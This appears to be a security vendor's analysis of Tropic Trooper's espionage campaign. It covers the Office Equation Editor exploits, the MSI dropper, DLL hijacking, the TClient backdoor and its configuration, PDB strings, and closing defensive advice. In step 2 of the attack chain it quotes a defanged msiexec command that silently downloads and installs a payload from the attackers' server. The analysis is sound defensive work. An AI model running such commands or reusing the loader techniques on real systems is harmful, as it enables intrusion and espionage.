Tropic Trooper (also known as KeyBoy) levels its campaigns against Taiwanese, Philippine, and
Hong Kong targets, focusing on their government, healthcare, transportation, and high-tech
industries. Its operators are believed to be very organized and develop their own cyberespionage
tools that they ﬁne-tuned in their recent campaigns. Many of the tools they use now feature new
behaviors, including a change in the way they maintain a foothold in the targeted network.

Security Predictions for 2018

Attack Chain
Attackers are banking on
network vulnerabilities and
inherent weaknesses to
facilitate massive malware
attacks, IoT hacks, and
operational disruptions. The
ever-shifting threats and
increasingly expanding
attack surface will challenge
users and enterprises to catch
up with their security.

Compromise
Figure 1. Attack chain of Tropic Trooper’s operations
Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:
1. Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security ﬂaws in
Microsoft Ofﬁce’s Equation Editor (EQNEDT32.EXE).
2. Download an installer package (.msi) and install it on the system by executing the command: /c
msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
3. This system conﬁguration ﬁle (in.sys) will drop a backdoor installer (UserInstall.exe) then delete
itself. The backdoor installer will drop a normal sidebar.exe ﬁle (a Windows Gadget tool, a feature
already discontinued by Windows), a malicious loader (in
“C:\ProgramData\Apple\Update\wab32res.dll“), and an encrypted conﬁguration ﬁle.
UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch
sidebar.exe.
4. The malicious loader will use dynamic-link library (DLL) hijacking — injecting malicious code
into a process of a ﬁle/application — on sidebar.exe and launch dllhost.exe (a normal ﬁle). The
loader will then inject a DLL backdoor into dllhost.exe.
We also observed malicious documents that don’t need to download anything from the internet as
the backdoor’s dropper is already embedded in the document. This, however, doesn’t inﬂuence the
overall result for the victim.
The backdoor will load the encrypted conﬁguration ﬁle and decrypt it, then use Secure Sockets
Layer (SSL) protocol to connect to command-and-control (C&C) servers.

Attackers are starting to
invest in long-term
operations that target speciﬁc
processes enterprises rely on.
They scout for vulnerable
practices, susceptible
systems and operational
loopholes that they can
leverage or abuse. To learn

Tropic Trooper uses exploit-laden Microsoft Ofﬁce documents to deliver malware to targets. These
documents use job vacancies in organizations that may be deemed socio-politically sensitive to
recipients. Below is a screenshot of the document used in their latest campaigns:

PDB Strings as Context Clues
The MSI ﬁle has two program database (PDB) strings inside: one belonging to the MSI ﬁle, and
another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB).

Figure 3. PDB strings inside the MSI ﬁle
The ﬁrst PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which we
found to be an open-source application that converts executable setup programs to MSI ﬁles. The
second PDB string contains Work, House, and TSSL: we can assume this tool belongs to Tropic
Trooper’s TSSL project as seen by other researchers. Here it is a new one, as seen in their
misspelling of “Horse” to “House” (other reports had the string typed correctly).
Another interesting PDB string we found is
D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the
MSI ﬁle drops three ﬁles and creates one hidden directory (UFile) into
C:\ProgramData\Apple\Update\, likely as a ruse.
It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through
DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is
loaded by a benign ﬁle.

Figure 5. PDB strings inside the loader ﬁle
From the PDB string above, the attackers intended it to be a loader (hence the name FakeRun) and
not the actual backdoor. FakeRun’s PDB string
(D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will
execute dllhost.exe and inject one malicious DLL ﬁle, which is the backdoor, into this process. The
backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string.

Malware Analysis
wab32res.dll (FakeRun loader) loads TClient. Once the loader is executed, it will check the current
process (sidebar.exe) whether to load it or not. Successfully checking the loader will execute the
dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as
there can be multiple instances of it depending on the number of programs using the Internet
Information Services.

Figure 9. Comparison of TClient’s conﬁguration format in 2016 (left, from other researchers) and
2018 (right)
TClient will use SSL to connect to Tropic Trooper’s C&C server. However, the C&C server and
some conﬁguration values are not hardcoded in the backdoor. This allows Tropic Trooper’s
operators to easily change/update the C&C server and conﬁgure other values.
TClient is actually one of Tropic Trooper’s other backdoors. The backdoor noted by other security
researchers was encoded with different algorithms and conﬁgured with different parameter names
in 2016, for instance. TClient uses symmetric encryption to decrypt its conﬁguration with one 16byte key in 2018. The image and table below illustrate TClient’s encrypted conﬁguration that we
decrypted (via Python code):

Figure 12. Decrypted backdoor conﬁguration
Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient
will use custom SSL libraries to connect the C&C server. We also found another SSL certiﬁcate on
this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after
a year, suggesting Tropic Trooper’s use or abuse of components or services that elapse so they can
leave as few traces as possible.

Following Tropic Trooper’s Trails
We further monitored their activities and found three additional and notable PDB strings in their
malware:
D:\Work\Project\VS\HSSL\HSSL_Unicode _2\Release\ServiceClient.pdb
D:\Work\VS\Horse\TSSL\TSSL_v3.0\TClient\Release\TClient.pdb
D:\Work\VS\Horse\TSSL\TSSL_v0.3.1_20170722\TClient\x64\Release\TClient.pdb
These came from open-intelligence platforms and incident response cases. These strings shed
further light on Tropic Trooper’s operations:
They have another campaign/project named HSSL, which supports Unicode characters.
The TSSL project has a v3.0 version, indicating the operators can mix and match different versions
of their malware, depending on their target.
The TSSL project has 64-bit version.
The Need for a Proactive Incident Response Strategy
Cyberespionage campaigns are persistent and, as shown by Tropic Trooper, always raring to exploit
weaknesses in people and technology. For organizations, this highlights the signiﬁcance of staying
ahead of their attackers: detect, analyze, and respond. What techniques will they use? How can my
organization’s attack surface be reduced? What did I do to respond to the threat — what worked,
what didn’t, and what could be ﬁne-tuned?
A proactive incident response strategy provides threat intelligence — from the endpoint to the
network — that can let IT/system administrators identify malicious activities that aren’t typically
visible to traditional security solutions.
TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others. Its
use of the SSL protocol also means it can blend with legitimate trafﬁc. Analyzing their PDB strings
can also provide a deeper insight into the campaign’s bigger picture. Ascertaining the tactics and
techniques they use empower organizations in developing robust and actionable indicators of
compromise (IoCs) that can act as benchmarks for response.

Here are some best practices that organizations can adopt:
Keep the system, its applications, and the network updated. The vulnerabilities that Tropic
Trooper’s campaigns have been patched last January, for instance. Enforce a stronger patch
management policy, and consider virtual patching for legacy systems.
Enforce the principle of least privilege: Employ network segmentation and data categorization to
deter lateral movement and mitigate further exposure. Application control and behavior monitoring
block suspicious ﬁles and anomalous routines from being installed or executed in the system.
Disable or secure the use of system administration tools such as PowerShell and other commandline tools that may be abused.
Actively monitor your perimeter, from gateways and endpoints to networks and servers. Firewalls
as well as intrusion detection and prevention systems help thwart network-based attacks.
Nurture a culture of cybersecurity. Spear-phishing emails, for instance, rely on baiting targets with
socially engineered documents. The technologies that help protect the organization are only as good
as the people who use them.
